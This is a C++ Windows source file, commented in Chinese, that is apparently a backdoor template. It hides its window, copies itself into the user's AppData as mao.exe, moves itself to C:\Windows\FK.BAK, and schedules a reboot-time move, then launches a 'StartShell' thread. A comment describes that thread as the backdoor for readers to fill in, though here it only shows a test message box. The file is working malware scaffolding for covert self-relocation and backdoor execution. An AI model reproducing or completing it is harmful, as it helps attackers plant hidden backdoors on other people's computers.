#include <stdio.h>
#include <string>
#include <Windows.h>
#include <tchar.h>
#include <ShlObj.h>
#include <Shlwapi.h>//PathAppendW
#pragma comment (lib, "shlwapi.lib")

#pragma comment(linker,"/SUBSYSTEM:WINDOWS")

DWORD WINAPI StartShell(LPVOID lpParam);

//C:\Users\Kandy\AppData\Roaming
std::wstring GetUserAppDataDir(void)
{
    //
    std::wstring appdata;
    wchar_t buffer[MAX_PATH];
    ::ZeroMemory(buffer, MAX_PATH * sizeof(wchar_t));
    if (::SHGetSpecialFolderPathW(NULL, buffer, CSIDL_APPDATA, NULL))
    {
        appdata = buffer;
        /*if (appdata.substr(appdata.length() - 1) != L"\\")
        {
            appdata.append(L"\\");
        }*/
    }

    //不为空
    wchar_t szTmp[MAX_PATH] = { 0 };
    wcscpy_s(szTmp, appdata.c_str());
    ::PathAppendW(szTmp, L"hello.exe");

    return szTmp;
}

//C:\Users\Kandy\AppData\Local
std::wstring GetLocalAppDataPath()
{
    std::wstring wsValue = L"";
    wchar_t	wzLacalAppData[MAX_PATH] = { 0 };
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, wzLacalAppData)))
    {
        wsValue = wzLacalAppData;
    }
    return wsValue;
}



//将wstring转换成string  
std::string wstring2string(std::wstring wstr)
{
    std::string result;
    //获取缓冲区大小，并申请空间，缓冲区大小事按字节计算的  
    int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
    char* buffer = new char[len + 1];
    //宽字节编码转换成多字节编码  
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
    buffer[len] = '\0';
    //删除缓冲区并返回值  
    result.append(buffer);
    delete[] buffer;
    return result;
}

int APIENTRY WinMain(HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine,
    int       nCmdShow)
{

    char szPath[MAX_PATH] = { 0 };
    ::GetSystemDirectory(szPath, MAX_PATH);
    std::wstring wDst = GetLocalAppDataPath();
    //wsprintf(szDst, "%s", GetLocalAppDataPath());

   // wcscat(strw, "\\mao.exe");
    wDst = wDst + L"\\mao.exe";



    wchar_t szTmp[MAX_PATH] = { 0 };
    if (!GetModuleFileNameW(NULL, szTmp, sizeof(szTmp)))
    {

        return 0;
    }
    int r;
    r = wcscmp(szTmp, wDst.c_str());
    if (!r)
    {
        goto stop;
    }

    if (!CopyFileW(szTmp, wDst.c_str(), FALSE))
    {
        return 0;
    }


stop:

    //printf("\n\t 现在的目录是%s\n",szDst);

    //得到当前程序名
    TCHAR szCurPath[MAX_PATH];
    memset(szCurPath, 0, MAX_PATH);
    GetModuleFileName(NULL, szCurPath, sizeof(szCurPath) / sizeof(TCHAR));

    //MoveFileEx(src, dst, flag)
    if (!(MoveFileEx(szCurPath, "C:\\Windows\\FK.BAK", MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)))//若是要在不同的volume下移动文件,需要此项 COPY_ALLOWED
    {
        ::MessageBox(NULL, "delete self 失败", "test", MB_OK);
    }


    std::string szDst = wstring2string(wDst);

    if (!::MoveFileEx("C:\\Windows\\FK.BAK", szDst.c_str(), MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING))
    {
        ::MessageBox(NULL, "move tmpfile to %Windows% 失败", "test", MB_OK);
    }
    else printf("任务完成\n");
    /*system("pause");*/


    //创建并等待线程
    //StartShell 为后门线程函数，大家可以自己实现相应的功能
    HANDLE hthread = ::CreateThread(NULL, NULL, StartShell, NULL, NULL, NULL);
    ::WaitForSingleObject(hthread, INFINITE);
    CloseHandle(hthread);
    return 0;
}

DWORD WINAPI StartShell(LPVOID lpParam)
{
    ::MessageBox(NULL, "New Thread", "test", MB_OK);
    return 0;
}
